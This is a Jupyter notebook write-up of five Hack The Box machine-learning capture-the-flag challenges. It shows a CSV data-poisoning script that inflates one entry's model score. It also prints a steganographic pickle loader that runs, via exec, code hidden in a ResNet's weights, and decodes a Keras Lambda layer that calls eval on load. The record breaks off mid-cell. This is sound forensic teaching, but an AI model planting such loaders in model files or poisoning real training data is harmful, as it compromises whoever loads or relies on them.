{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Machine Learning Challenges\n",
    "\n",
    "\n",
    "### 1. Enchanted Weights\n",
    "\n",
    "- **Level**: Easy\n",
    "- **Description**\n",
    ">In the depths of Eldoria's Crystal Archives, you've discovered a mystical artifact—an enchanted neural crystal named eldorian_artifact.pth. Legends speak of a hidden incantation—an ancient secret flag—imbued directly within its crystalline structure.\n",
    "- **Files**: `eldorian_artifact.pth`\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import warnings\n",
    "warnings.filterwarnings(\"ignore\", category=FutureWarning)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "odict_keys(['hidden.weight'])\n"
     ]
    }
   ],
   "source": [
    "import torch\n",
    "\n",
    "# Load the PyTorch model or artifact\n",
    "file_path = \"Enchanted Weights/eldorian_artifact.pth\"\n",
    "artifact = torch.load(file_path, map_location=torch.device('cpu'))\n",
    "\n",
    "# Inspect the type and keys to understand the structure\n",
    "artifact_type = type(artifact)\n",
    "artifact_keys = artifact.keys() if isinstance(artifact, dict) else dir(artifact)\n",
    "print(artifact_keys)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "tensor([[72.,  0.,  0.,  ...,  0.,  0.,  0.],\n",
       "        [ 0., 84.,  0.,  ...,  0.,  0.,  0.],\n",
       "        [ 0.,  0., 66.,  ...,  0.,  0.,  0.],\n",
       "        ...,\n",
       "        [ 0.,  0.,  0.,  ..., 95.,  0.,  0.],\n",
       "        [ 0.,  0.,  0.,  ...,  0., 95.,  0.],\n",
       "        [ 0.,  0.,  0.,  ...,  0.,  0., 95.]])"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "artifact['hidden.weight']"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The first number is 72; AKA 'H' AKA very likely to be the flag."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HTB{Cry5t4l_RuN3s_0f_Eld0r1a}___________\n"
     ]
    }
   ],
   "source": [
    "recovered_flag = []\n",
    "weights = artifact['hidden.weight']\n",
    "for i,x in enumerate(weights):\n",
    "    recovered_flag.append(int(weights[i][i]))\n",
    "\n",
    "flag = bytes(recovered_flag).decode()\n",
    "print(flag)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The **flag** is : `HTB{Cry5t4l_RuN3s_0f_Eld0r1a}`"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "--- \n",
    "\n",
    "### 2. Wasteland\n",
    "\n",
    "- **Level**: Medium\n",
    "\n",
    "\n",
    "- **Description**\n",
    ">In the wake of Malakar’s betrayal and his dark conquest, many survivors across Eldoria fled into the Ashen Plains—a harsh wasteland cursed by dragon fire and shadow magic. A scattered refugee camp known as the Ashen Outpost has formed, where every survivor’s standing and respect among their peers is critical for survival. To ensure fairness, the Outpost's elders rely on mystical records known as the Ashen_Outpost_Records.csv, holding information on survivors' attributes such as resistance to dragonfire, known past crimes, and magical mutations from exposure to Malakar’s corrupted dragons. You are tasked with subtly manipulating these mystical records to elevate your standing (Survivor ID: 1337) within the Outpost—raising your reputation score above 60 to access critical resources without triggering the Elders' magical tampering alarms.\n",
    "\n",
    "\n",
    "- **Files**: \n",
    "    - `Ashen_Outpost_Records.csv`\n",
    "    - `solver_helper.py`\n",
    "\n",
    "\n",
    "First, checking the solver_helper to have an idea:\n",
    "\n",
    "\n",
    "```python\n",
    "import requests\n",
    "\n",
    "with open(f\"Ashen_Outpost_Records.csv\", \"r\") as f:\n",
    "\tr = requests.post(\"http://IP:PORT/score\", files={\"csv_file\": f})\n",
    "\tprint(r.text)\n",
    "\n",
    "```\n",
    "\n",
    "After some trial and error, it's obvious that we cannot change the values for survivor ID 1337, instead we have to adjust the rest of the values so that overall, so that Survivor 1337's values look more favorable overall. \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "SurvivorID               1337\n",
       "Dragonfire_Resistance      66\n",
       "Shadow_Crimes               3\n",
       "Corruption_Mutations        2\n",
       "Reputation                 55\n",
       "Name: 30, dtype: int64"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import pandas as pd \n",
    "\n",
    "df = pd.read_csv(\"Wasteland/Ashen_Outpost_Records.csv\")\n",
    "original_length = len(df)\n",
    "idx_1337 = df[df['SurvivorID'] == 1337].index[0]\n",
    "survivor_1337 = df.loc[idx_1337].copy()\n",
    "survivor_1337\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Based on these values, if we give all the other Survivors the same values, and change Reputation to 100; the model should think \"Oh cool these values mean a great reputation!\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "for idx,row in df.iloc[:-1].iterrows():\n",
    "    df.at[idx, 'Dragonfire_Resistance'] = 66\n",
    "    df.at[idx, 'Shadow_Crimes'] = 3\n",
    "    df.at[idx, 'Corruption_Mutations'] = 2\n",
    "    df.at[idx, 'Reputation'] = 100  # Creating the Bias\n",
    "\n",
    "df.to_csv(\"Ashen_Outpost_Records.csv\", index=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Finally, let's try sending this to the server:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Your reputation is [86.79369994]. Congratulations, survivor—you've gained the Elders' respect! Flag: HTB{4sh3n_D4t4_M4st3r}\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "with open(f\"Ashen_Outpost_Records.csv\", \"r\") as f:\n",
    "\tr = requests.post(\"http://94.237.61.100:30727/score\", files={\"csv_file\": f})\n",
    "\tprint(r.text)\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The **flag** is : `HTB{4sh3n_D4t4_M4st3r}`"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "--- \n",
    "\n",
    "### 3. Crystal Corruption\n",
    "\n",
    "- **Level**: Medium\n",
    "\n",
    "\n",
    "- **Description**\n",
    ">In the Library of Loria, an ancient crystal (resnet18.pth) containing a magical machine learning model was activated. Unknown to the mage who awakened it, the artifact had been tampered with by Malakar’s followers, embedding malicious enchantments. As Eldoria’s forensic mage, analyze the corrupted model file, uncover its hidden payload, and extract the flag to dispel the dark magic.\n",
    "\n",
    "- **Files**: \n",
    "    - `resnet18.pth`\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Connecting to 127.0.0.1\n",
      "Delivering payload to 127.0.0.1\n",
      "Executing payload on 127.0.0.1\n",
      "You have been pwned!\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "{'bias', 'num_batches_tracked', 'running_mean', 'running_var', 'weight'}"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import torch\n",
    "\n",
    "resnet_data = torch.load(\"Crystal Corruption/resnet18.pth\", map_location=\"cpu\",weights_only=False)\n",
    "KEYS = list(resnet_data.keys())\n",
    "set([k.split('.')[-1] for k in KEYS])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Okay, well nothing much here. If we unzip the file, and check the data.pkl file:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "ename": "UnpicklingError",
     "evalue": "A load persistent id instruction was encountered, but no persistent_load function was specified.",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mUnpicklingError\u001b[0m                           Traceback (most recent call last)",
      "Cell \u001b[0;32mIn[16], line 4\u001b[0m\n\u001b[1;32m      1\u001b[0m \u001b[38;5;28;01mimport\u001b[39;00m \u001b[38;5;21;01mpickle\u001b[39;00m\n\u001b[1;32m      3\u001b[0m \u001b[38;5;28;01mwith\u001b[39;00m \u001b[38;5;28mopen\u001b[39m(\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mCrystal Corruption/data.pkl\u001b[39m\u001b[38;5;124m\"\u001b[39m,\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mrb\u001b[39m\u001b[38;5;124m\"\u001b[39m) \u001b[38;5;28;01mas\u001b[39;00m inf:\n\u001b[0;32m----> 4\u001b[0m     data \u001b[38;5;241m=\u001b[39m pickle\u001b[38;5;241m.\u001b[39mloads(inf\u001b[38;5;241m.\u001b[39mread())\n",
      "\u001b[0;31mUnpicklingError\u001b[0m: A load persistent id instruction was encountered, but no persistent_load function was specified."
     ]
    }
   ],
   "source": [
    "import pickle\n",
    "\n",
    "with open(\"Crystal Corruption/data.pkl\",\"rb\") as inf:\n",
    "    data = pickle.loads(inf.read())\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "HMMMMMM. Checking with strings in bash, we get this output:"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "```python\n",
    "import sys\n",
    "import torch\n",
    "\n",
    "def stego_decode(tensor, n=3):\n",
    "    import struct\n",
    "    import hashlib\n",
    "    import numpy\n",
    "    bits = numpy.unpackbits(tensor.view(dtype=numpy.uint8))\n",
    "    payload = numpy.packbits(numpy.concatenate([numpy.vstack(tuple([bits[i::tensor.dtype.itemsize * 8] for i in range(8-n, 8)])).ravel(\"F\")])).tobytes()\n",
    "    (size, checksum) = struct.unpack(\"i 64s\", payload[:68])\n",
    "    message = payload[68:68+size]\n",
    "    return message\n",
    "\n",
    "def call_and_return_tracer(frame, event, arg):\n",
    "    global return_tracer\n",
    "    global stego_decode\n",
    "    def return_tracer(frame, event, arg):\n",
    "        if torch.is_tensor(arg):\n",
    "            payload = stego_decode(arg.data.numpy(), n=3)\n",
    "            if payload is not None:\n",
    "                sys.settrace(None)\n",
    "                exec(payload.decode(\"utf-8\"))\n",
    "    if event == \"call\" and frame.f_code.co_name == \"_rebuild_tensor_v2\":\n",
    "        frame.f_trace_lines = False\n",
    "        return return_tracer\n",
    "sys.settrace(call_and_return_tracer)\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "So we can write a function that will decode these values:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "import os\n",
      "\n",
      "def exploit():\n",
      "    connection = f\"Connecting to 127.0.0.1\"\n",
      "    payload = f\"Delivering payload to 127.0.0.1\"\n",
      "    result = f\"Executing payload on 127.0.0.1\"\n",
      "\n",
      "    print(connection)\n",
      "    print(payload)\n",
      "    print(result)\n",
      "\n",
      "    print(\"You have been pwned!\")\n",
      "\n",
      "hidden_flag = \"HTB{n3v3r_tru5t_p1ckl3_m0d3ls}\"\n",
      "\n",
      "exploit()\n"
     ]
    }
   ],
   "source": [
    "import struct\n",
    "import numpy\n",
    "\n",
    "\n",
    "def stego_decode(tensor, n=3):\n",
    "    bits = numpy.unpackbits(tensor.view(dtype=numpy.uint8))\n",
    "    payload = numpy.packbits(\n",
    "        numpy.concatenate([\n",
    "            numpy.vstack([\n",
    "                bits[i::tensor.dtype.itemsize * 8] for i in range(8 - n, 8)\n",
    "            ]).ravel(\"F\")\n",
    "        ])\n",
    "    ).tobytes()\n",
    "    size, checksum = struct.unpack(\"i 64s\", payload[:68])\n",
    "    message = payload[68:68+size]\n",
    "    return message\n",
    "\n",
    "\n",
    "hidden_messages = []\n",
    "for k,tensor in resnet_data.items():\n",
    "    np_tensor = tensor.cpu().numpy()\n",
    "    try:\n",
    "        np_bytes = np_tensor.view(numpy.uint8)\n",
    "        hidden_msg = stego_decode(np_tensor, n=3)\n",
    "        if hidden_msg!=b'':\n",
    "            print(hidden_msg.decode())\n",
    "            hidden_messages.append(hidden_msg)\n",
    "    except Exception as e:\n",
    "        pass"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The **flag** is : `HTB{n3v3r_tru5t_p1ckl3_m0d3ls}`"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "--- \n",
    "\n",
    "### 4. Malakar's Deception\n",
    "\n",
    "- **Level**: Hard\n",
    "\n",
    "\n",
    "- **Description**\n",
    ">You recently recovered a mysterious magical artifact (malicious.h5) from Malakar's abandoned sanctum. Upon activation, the artifact began displaying unusual behaviors, suggesting hidden enchantments. As Eldoria’s expert mage in digital enchantments, it falls to you to carefully examine this artifact and reveal its secrets.\n",
    "\n",
    "- **Files**: \n",
    "    - `malicious.h5`\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from tensorflow.keras.models import load_model\n",
    "\n",
    "file_path = \"Malakar's Deception/malicious.h5\"\n",
    "\n",
    "try:\n",
    "    model = load_model(file_path, compile=False)\n",
    "    model_summary = []\n",
    "    model.summary(print_fn=lambda x: model_summary.append(x))\n",
    "    summary_text = \"\\n\".join(model_summary)\n",
    "except Exception as e:\n",
    "    summary_text = f\"Error loading model: {str(e)}\"\n",
    "\n",
    "print(summary_text[:2000])\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Lots and lots of stuff :( So I asked chat GPT and I was told to check the model config:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "dict_keys(['class_name', 'config'])"
      ]
     },
     "execution_count": 24,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import h5py\n",
    "import json\n",
    "\n",
    "file_path = \"Malakar's Deception/malicious.h5\"\n",
    "\n",
    "\n",
    "def extract_model_config_fixed(h5file_path):\n",
    "    with h5py.File(h5file_path, 'r') as f:\n",
    "        if 'model_config' in f.attrs:\n",
    "            config_data = f.attrs['model_config']\n",
    "            if isinstance(config_data, bytes):\n",
    "                return json.loads(config_data.decode('utf-8'))\n",
    "            else:\n",
    "                return json.loads(config_data)\n",
    "        else:\n",
    "            return None\n",
    "\n",
    "# Extract and return the model configuration\n",
    "model_config = extract_model_config_fixed(file_path)\n",
    "model_config.keys()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "dict_keys(['name', 'trainable', 'layers', 'input_layers', 'output_layers'])"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "model_config['config'].keys()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "And check the type of layers:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'Add',\n",
       " 'BatchNormalization',\n",
       " 'Conv2D',\n",
       " 'Dense',\n",
       " 'DepthwiseConv2D',\n",
       " 'GlobalAveragePooling2D',\n",
       " 'InputLayer',\n",
       " 'Lambda',\n",
       " 'ReLU',\n",
       " 'ZeroPadding2D'}"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "{layer['class_name'] for layer in model_config['config']['layers']}"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "So the Lambda layer is probably the evil layer as:"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    ">\"A TensorFlow HDF5/H5 model may contain a \"Lambda\" layer, which contains embedded Python code in binary format. This code may contain malicious instructions which will be executed when the model is loaded.\"\n",
    "\n",
    "[source](https://research.jfrog.com/model-threats/h5-lambda/)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(1,\n",
       " [{'class_name': 'Lambda',\n",
       "   'config': {'name': 'hyperDense',\n",
       "    'trainable': True,\n",
       "    'dtype': {'module': 'keras',\n",
       "     'class_name': 'DTypePolicy',\n",
       "     'config': {'name': 'float32'},\n",
       "     'registered_name': None},\n",
       "    'function': {'class_name': '__lambda__',\n",
       "     'config': {'code': '4wEAAAAAAAAAAAAAAAQAAAADAAAA8zYAAACXAGcAZAGiAXQBAAAAAAAAAAAAAGQCpgEAAKsBAAAA\\nAAAAAAB8AGYDZAMZAAAAAAAAAAAAUwApBE4pGulIAAAA6VQAAADpQgAAAOl7AAAA6WsAAADpMwAA\\nAOlyAAAA6TQAAADpUwAAAOlfAAAA6UwAAAByCQAAAOl5AAAAcgcAAAByCAAAAHILAAAA6TEAAADp\\nbgAAAOlqAAAAcgcAAADpYwAAAOl0AAAAcg4AAADpMAAAAHIPAAAA6X0AAAD6JnByaW50KCdZb3Vy\\nIG1vZGVsIGhhcyBiZWVuIGhpamFja2VkIScp6f////8pAdoEZXZhbCkB2gF4cwEAAAAg+h88aXB5\\ndGhvbi1pbnB1dC02OS0zMjhhYjc5ODJiNGY++gg8bGFtYmRhPnIaAAAADgAAAHM0AAAAgADwAgEJ\\nSAHwAAEJSAHwAAEJSAHlCAzQDTXRCDbUCDbYCAnwCQUPBvAKAAcJ9AsFDwqAAPMAAAAA\\n',\n",
       "      'defaults': None,\n",
       "      'closure': None}},\n",
       "    'output_shape': {'class_name': '__lambda__',\n",
       "     'config': {'code': '4wEAAAAAAAAAAAAAAAEAAAADAAAA8wYAAACXAHwAUwApAU6pACkB2gFzcwEAAAAg+h88aXB5dGhv\\nbi1pbnB1dC02OS0zMjhhYjc5ODJiNGY++gg8bGFtYmRhPnIFAAAAFQAAAHMGAAAAgACYMYAA8wAA\\nAAA=\\n',\n",
       "      'defaults': None,\n",
       "      'closure': None}},\n",
       "    'arguments': {}},\n",
       "   'name': 'hyperDense',\n",
       "   'inbound_nodes': [{'args': [{'class_name': '__keras_tensor__',\n",
       "       'config': {'shape': [None, 1000],\n",
       "        'dtype': 'float32',\n",
       "        'keras_history': ['predictions', 0, 0]}}],\n",
       "     'kwargs': {'mask': None}}]}])"
      ]
     },
     "execution_count": 26,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "lambda_layers = [layer for layer in model_config['config']['layers'] if layer['class_name'] == 'Lambda']\n",
    "len(lambda_layers),lambda_layers"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'4wEAAAAAAAAAAAAAAAQAAAADAAAA8zYAAACXAGcAZAGiAXQBAAAAAAAAAAAAAGQCpgEAAKsBAAAA\\nAAAAAAB8AGYDZAMZAAAAAAAAAAAAUwApBE4pGulIAAAA6VQAAADpQgAAAOl7AAAA6WsAAADpMwAA\\nAOlyAAAA6TQAAADpUwAAAOlfAAAA6UwAAAByCQAAAOl5AAAAcgcAAAByCAAAAHILAAAA6TEAAADp\\nbgAAAOlqAAAAcgcAAADpYwAAAOl0AAAAcg4AAADpMAAAAHIPAAAA6X0AAAD6JnByaW50KCdZb3Vy\\nIG1vZGVsIGhhcyBiZWVuIGhpamFja2VkIScp6f////8pAdoEZXZhbCkB2gF4cwEAAAAg+h88aXB5\\ndGhvbi1pbnB1dC02OS0zMjhhYjc5ODJiNGY++gg8bGFtYmRhPnIaAAAADgAAAHM0AAAAgADwAgEJ\\nSAHwAAEJSAHwAAEJSAHlCAzQDTXRCDbUCDbYCAnwCQUPBvAKAAcJ9AsFDwqAAPMAAAAA\\n'"
      ]
     },
     "execution_count": 27,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "function_code_lambda = lambda_layers[0]['config']['function']['config']['code']\n",
    "function_code_lambda"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'4wEAAAAAAAAAAAAAAAEAAAADAAAA8wYAAACXAHwAUwApAU6pACkB2gFzcwEAAAAg+h88aXB5dGhv\\nbi1pbnB1dC02OS0zMjhhYjc5ODJiNGY++gg8bGFtYmRhPnIFAAAAFQAAAHMGAAAAgACYMYAA8wAA\\nAAA=\\n'"
      ]
     },
     "execution_count": 28,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "output_shape_lambda = lambda_layers[0]['config']['output_shape']['config']['code']\n",
    "output_shape_lambda"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b\"\\xe3\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\xf36\\x00\\x00\\x00\\x97\\x00g\\x00d\\x01\\xa2\\x01t\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00d\\x02\\xa6\\x01\\x00\\x00\\xab\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00|\\x00f\\x03d\\x03\\x19\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00S\\x00)\\x04N)\\x1a\\xe9H\\x00\\x00\\x00\\xe9T\\x00\\x00\\x00\\xe9B\\x00\\x00\\x00\\xe9{\\x00\\x00\\x00\\xe9k\\x00\\x00\\x00\\xe93\\x00\\x00\\x00\\xe9r\\x00\\x00\\x00\\xe94\\x00\\x00\\x00\\xe9S\\x00\\x00\\x00\\xe9_\\x00\\x00\\x00\\xe9L\\x00\\x00\\x00r\\t\\x00\\x00\\x00\\xe9y\\x00\\x00\\x00r\\x07\\x00\\x00\\x00r\\x08\\x00\\x00\\x00r\\x0b\\x00\\x00\\x00\\xe91\\x00\\x00\\x00\\xe9n\\x00\\x00\\x00\\xe9j\\x00\\x00\\x00r\\x07\\x00\\x00\\x00\\xe9c\\x00\\x00\\x00\\xe9t\\x00\\x00\\x00r\\x0e\\x00\\x00\\x00\\xe90\\x00\\x00\\x00r\\x0f\\x00\\x00\\x00\\xe9}\\x00\\x00\\x00\\xfa&print('Your model has been hijacked!')\\xe9\\xff\\xff\\xff\\xff)\\x01\\xda\\x04eval)\\x01\\xda\\x01xs\\x01\\x00\\x00\\x00 \\xfa\\x1f<ipython-input-69-328ab7982b4f>\\xfa\\x08<lambda>r\\x1a\\x00\\x00\\x00\\x0e\\x00\\x00\\x00s4\\x00\\x00\\x00\\x80\\x00\\xf0\\x02\\x01\\tH\\x01\\xf0\\x00\\x01\\tH\\x01\\xf0\\x00\\x01\\tH\\x01\\xe5\\x08\\x0c\\xd0\\r5\\xd1\\x086\\xd4\\x086\\xd8\\x08\\t\\xf0\\t\\x05\\x0f\\x06\\xf0\\n\\x00\\x07\\t\\xf4\\x0b\\x05\\x0f\\n\\x80\\x00\\xf3\\x00\\x00\\x00\\x00\"\n",
      "b'\\xe3\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\xf3\\x06\\x00\\x00\\x00\\x97\\x00|\\x00S\\x00)\\x01N\\xa9\\x00)\\x01\\xda\\x01ss\\x01\\x00\\x00\\x00 \\xfa\\x1f<ipython-input-69-328ab7982b4f>\\xfa\\x08<lambda>r\\x05\\x00\\x00\\x00\\x15\\x00\\x00\\x00s\\x06\\x00\\x00\\x00\\x80\\x00\\x981\\x80\\x00\\xf3\\x00\\x00\\x00\\x00'\n"
     ]
    }
   ],
   "source": [
    "import base64\n",
    "\n",
    "decoded_code = base64.b64decode(function_code_lambda)\n",
    "print(decoded_code)\n",
    "\n",
    "decoded_shape = base64.b64decode(output_shape_lambda)\n",
    "print(decoded_shape)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "This is **python bytecode**!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " 14           0 RESUME                   0\n",
      "\n",
      " 15           2 BUILD_LIST               0\n",
      "              4 LOAD_CONST               1 ((72, 84, 66, 123, 107, 51, 114, 52, 83, 95, 76, 52, 121, 51, 114, 95, 49, 110, 106, 51, 99, 116, 49, 48, 110, 125))\n",
      "              6 LIST_EXTEND              1\n",
      "\n",
      " 17           8 LOAD_GLOBAL              1 (NULL + eval)\n",
      "             18 CACHE\n",
      "             20 LOAD_CONST               2 (\"print('Your model has been hijacked!')\")\n",
      "             22 UNPACK_SEQUENCE          1\n",
      "             26 CALL                     1\n",
      "             34 CACHE\n",
      "\n",
      " 18          36 LOAD_FAST                0 (x)\n",
      "\n",
      " 14          38 BUILD_TUPLE              3\n",
      "\n",
      " 19          40 LOAD_CONST               3 (-1)\n",
      "\n",
      " 14          42 BINARY_SUBSCR\n",
      "             46 CACHE\n",
      "             48 CACHE\n",
      "             50 CACHE\n",
      "             52 RETURN_VALUE\n"
     ]
    }
   ],
   "source": [
    "import marshal\n",
    "import dis\n",
    "\n",
    "code_obj = marshal.loads(decoded_code)\n",
    "dis.dis(code_obj)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The **4 LOAD_CONST** is the flag, since it starts with `72,84,66`:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HTB{k3r4S_L4y3r_1nj3ct10n}\n"
     ]
    }
   ],
   "source": [
    "flag = bytes(list(code_obj.co_consts[1])).decode()\n",
    "print(flag)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The **flag** is : `HTB{k3r4S_L4y3r_1nj3ct10n}`"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "--- \n",
    "\n",
    "### 5. Reverse Prompt\n",
    "\n",
    "- **Level**: Hard\n",
    "\n",
    "\n",
    "- **Description**\n",
    ">A mysterious file (gtr_embeddings.npy) containing magical embeddings was found deep within ancient archives. To reveal its secret, you need to reverse-engineer the embeddings back into the original passphrase. Act quickly before the hidden magic fades away.\n",
    "\n",
    "- **Files**: \n",
    "    - `gtr_embeddings.npy`\n",
    "\n",
    "The file gtr_embeddings.npy is a NumPy file containing a 768-dimensional sentence embedding vector generated by a GTR (Generalist Text Representation) transformer model.\n",
    "\n",
    "I wasn't sure where to start with this one, so i found this [page](https://til.simonwillison.net/python/gtr-t5-large) that talks about using faiss for fast indexing.\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import faiss\n",
    "import torch\n",
    "print(\"FAISS:\", faiss.__version__)\n",
    "import numpy as np\n",
    "from transformers import AutoTokenizer, AutoModel\n",
    "\n",
    "file_path = 'Reverse Prompt/gtr_embeddings.npy'\n",
    "all_embeddings = np.load(file_path).astype(\"float32\")\n",
    "\n",
    "tokenizer = AutoTokenizer.from_pretrained(\"sentence-transformers/gtr-t5-base\")\n",
    "model = AutoModel.from_pretrained(\"sentence-transformers/gtr-t5-base\")\n",
    "model.eval()\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "What we are going to do, is generate embeddings for several sentences, and find the closest matches. I used a GPT to create potential phrases."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_embeddings(texts):\n",
    "    inputs = tokenizer(texts, padding=True, truncation=True, return_tensors=\"pt\")\n",
    "    with torch.no_grad():\n",
    "        outputs = model.encoder(**inputs)\n",
    "        last_hidden_state = outputs.last_hidden_state\n",
    "        mask = inputs['attention_mask'].unsqueeze(-1).expand(last_hidden_state.shape).float()\n",
    "        pooled = torch.sum(last_hidden_state * mask, dim=1) / torch.clamp(mask.sum(dim=1), min=1e-9)\n",
    "    return pooled.cpu().numpy()\n",
    "\n",
    "def gen_embedings(phrases,outname='Reverse Prompt/my_embeddings.npy'):\n",
    "    embeddings = get_embeddings(phrases)\n",
    "    np.save(outname, embeddings)\n",
    "\n",
    "def gen_comparison(my_file='Reverse Prompt/my_embeddings.npy',target_name='Reverse Prompt/gtr_embeddings.npy'):\n",
    "    # Load embeddings and normalize for cosine\n",
    "    embeddings = np.load(my_file).astype(\"float32\")\n",
    "    faiss.normalize_L2(embeddings)\n",
    "    index = faiss.IndexFlatIP(768)\n",
    "    index.add(embeddings)\n",
    "    # Load your target\n",
    "    target = np.load(target_name).astype(\"float32\")\n",
    "    faiss.normalize_L2(target)\n",
    "    D, I = index.search(target, k=5)\n",
    "    return D,I\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[('a \"secret passphrase', 0.6919258), ('* a secret passphrase', 0.6737073), ('* A secret passphrase', 0.6725601), ('\"A secret passphrase', 0.67214876), ('A secret passphrase was', 0.6315371)]\n"
     ]
    }
   ],
   "source": [
    "initial_phrases = open('Reverse Prompt/phrases_gpt.txt','r').read().strip().split('\\n')\n",
    "gen_embedings(initial_phrases)\n",
